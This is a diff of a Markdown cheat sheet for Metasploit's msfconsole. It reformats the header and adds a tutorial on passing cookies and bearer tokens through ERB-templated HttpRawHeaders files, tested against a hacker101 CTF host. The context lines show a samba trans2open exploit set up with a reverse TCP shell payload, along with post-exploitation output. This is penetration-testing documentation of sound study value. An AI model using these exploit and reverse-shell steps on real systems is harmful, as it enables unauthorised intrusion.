@@ -3,12 +3,14 @@ tags: [shell,snmp]
 ---
 # msfconsole
 
-## References
-
-`msfconsole` is the command line (CLI) interpreter of metasploit framework (msf).
-
-- Basic: https://www.offensive-security.com/metasploit-unleashed/msfconsole/
-- https://inventory.raw.pm/tools.html#Metasploit
+=== Info
+- **Description**: command line (CLI) interpreter of metasploit framework (msf).
+- Version tested: 5.x.x, 6.2.21-dev
+- Initial review date: 30/07/2019
+- Last update date: 20/11/2022
+- [Source](https://github.com/rapid7/metasploit-framework)
+- [Rawsec Inventory](https://inventory.raw.pm/tools.html#Metasploit)
+===
 
 ## Handler
 
@@ -53,13 +55,13 @@ Matching Modules
    exploit/windows/http/hp_nnm_ovwebsnmpsrv_uro       2010-06-08       great   HP OpenView Network Node Manager ovwebsnmpsrv.exe Unrecognized Option Buffer Overflow
    exploit/windows/http/hp_nnm_snmp                   2009-12-09       great   HP OpenView Network Node Manager Snmp.exe CGI Buffer Overflow
    exploit/windows/http/hp_nnm_snmpviewer_actapp      2010-05-11       great   HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow
-   post/windows/gather/enum_snmp  
+   post/windows/gather/enum_snmp
 ```
 
 ## Change of payload
 
 ```
-msf5 exploit(linux/samba/trans2open) > show payloads 
+msf5 exploit(linux/samba/trans2open) > show payloads
 
 Compatible Payloads
 ===================
@@ -101,9 +103,9 @@ Compatible Payloads
    33  linux/x86/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
    34  linux/x86/shell_reverse_tcp_ipv6                           normal  No     Linux Command Shell, Reverse TCP Inline (IPv6)
 
-msf5 exploit(linux/samba/trans2open) > set payload generic/shell_reverse_tcp 
+msf5 exploit(linux/samba/trans2open) > set payload generic/shell_reverse_tcp
 payload => generic/shell_reverse_tcp
-msf5 exploit(linux/samba/trans2open) > show options 
+msf5 exploit(linux/samba/trans2open) > show options
 
 Module options (exploit/linux/samba/trans2open):
 
@@ -167,4 +169,126 @@ hostname\alice
 
 [*] Removing temp file C:\Windows\Temp\NuhelUOR.txt
 [*] Post module execution completed
+```
+
+## Set HTTP headers
+
+Let's say you want to run the `auxiliary/scanner/http/title` module with the following
+configuration.
+
+```
+msf6 auxiliary(scanner/http/title) > options
+
+Module options (auxiliary/scanner/http/title):
+
+   Name         Current Setting                                     Required  Description
+   ----         ---------------                                     --------  -----------
+   Proxies                                                          no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS       54.186.210.202 54.188.216.194                       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT        443                                                 yes       The target port (TCP)
+   SHOW_TITLES  true                                                yes       Show the titles on the console as they are grabbed
+   SSL          true                                                no        Negotiate SSL/TLS for outgoing connections
+   STORE_NOTES  true                                                yes       Store the captured information in notes. Use "notes -t http.title" to view
+   TARGETURI    /                                                   yes       The base path
+   THREADS      1                                                   yes       The number of concurrent threads (max one per host)
+   VHOST        301207a9dbaa3720bf085a6329977d5b.ctf.hacker101.com  no        HTTP server virtual host
+```
+
+But you want an authenticated scan so you need to provide a Cookie or an authentication bearer. In MSF 6 you'll have to configure the _Advanced_ option `HttpRawHeaders`.
+
+`HttpRawHeaders` have been added to all major branches.
+
+- MSF 6.2.27:
+   - [lib/msf/core/exploit/remote/http_client.rb](https://github.com/rapid7/metasploit-framework/blob/29a4546b0760369028491b8fe98ebb343444f6bf/lib/msf/core/exploit/remote/http_client.rb#L35-L53)
+   - [docs/metasploit-framework.wiki/Metasploit-Guide-HTTP.md](https://github.com/rapid7/metasploit-framework/blob/6.2.27/docs/metasploit-framework.wiki/Metasploit-Guide-HTTP.md?plain=1#L137-L160)
+- MSF 5.0.101:
+   - [lib/msf/core/exploit/http/client.rb](https://github.com/rapid7/metasploit-framework/blob/2382d7530cf0cf2aa4ac63be30c98ca3fcdd6bbf/lib/msf/core/exploit/http/client.rb#L33-L51)
+- MSF 4.17.103:
+   - [lib/msf/core/exploit/http/client.rb](https://github.com/rapid7/metasploit-framework/blob/f957f1f58b3effa2603e93f4dff46c4adee695c8/lib/msf/core/exploit/http/client.rb#L33-L49)
+
+The official description is the following:
+
+> Path to ERB-templatized raw headers to append to existing headers
+
+This means you have to provide a path to a file containing HTTP headers like in a raw HTTP request or in Burp Suite.
+
+For example, `/tmp/headers.txt`:
+
+```http
+Cookie: session=556cc23863fef20fab5c456db166bc6e
+X-Custom-Name: noraj
+Authorization: Bearer AbCdEf123456
+```
+
+To see what's happening let's configure an upstream proxy to MSF.
+
+```
+msf6 auxiliary(scanner/http/title) > set Proxies http:127.0.0.1:8080
+Proxies => http:127.0.0.1:8080
+```
+
+Then, run the module without `HttpRawHeaders`. Here is what we have in Burp Suite proxy.
+
+```http
+GET / HTTP/2
+Host: 301207a9dbaa3720bf085a6329977d5b.ctf.hacker101.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
+```
+
+Now set the file with raw HTTP headers:
+
+```
+msf6 auxiliary(scanner/http/title) > set HttpRawHeaders /tmp/headers.txt
+HttpRawHeaders => /tmp/headers.txt
+```
+
+Note: I had a bug when using both `Proxies` and `HttpRawHeaders` that prevented the module to work correctly.
+So instead let's use a request bin without proxy.
+
+```
+msf6 auxiliary(scanner/http/title) > unset Proxies
+Unsetting Proxies...
+msf6 auxiliary(scanner/http/title) > set VHOST msf.requestcatcher.com
+VHOST => msf.requestcatcher.com
+msf6 auxiliary(scanner/http/title) > set RHOSTS 104.248.184.153
+RHOSTS => 104.248.184.153
+```
+
+We receive a request with the 3 extra headers we added:
+
+```http
+GET / HTTP/1.1
+Host: msf.requestcatcher.com
+Authorization: Bearer AbCdEf123456
+Cookie: session=556cc23863fef20fab5c456db166bc6e
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
+X-Custom-Name: noraj
+```
+
+But you remember the description said _ERB-templatized raw headers_, it means we can do more powerful stuff.
+
+Basically, we can add [ERB templating](https://github.com/ruby/erb) into the raw headers file to perform some dynamic logic.
+
+Now replace the file with this basic templating to use a small loop:
+
+```erb
+Cookie: session=556cc23863fef20fab5c456db166bc6e<% for i in 0..5 do %>
+X-Custom-Name: noraj-<%= i %><% end %>
+Authorization: Bearer AbCdEf123456
+```
+
+Here is what we are receiving:
+
+```http
+GET / HTTP/1.1
+Host: msf.requestcatcher.com
+Authorization: Bearer AbCdEf123456
+Cookie: session=556cc23863fef20fab5c456db166bc6e
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
+X-Custom-Name: noraj-0
+X-Custom-Name: noraj-1
+X-Custom-Name: noraj-2
+X-Custom-Name: noraj-3
+X-Custom-Name: noraj-4
+X-Custom-Name: noraj-5
 ```
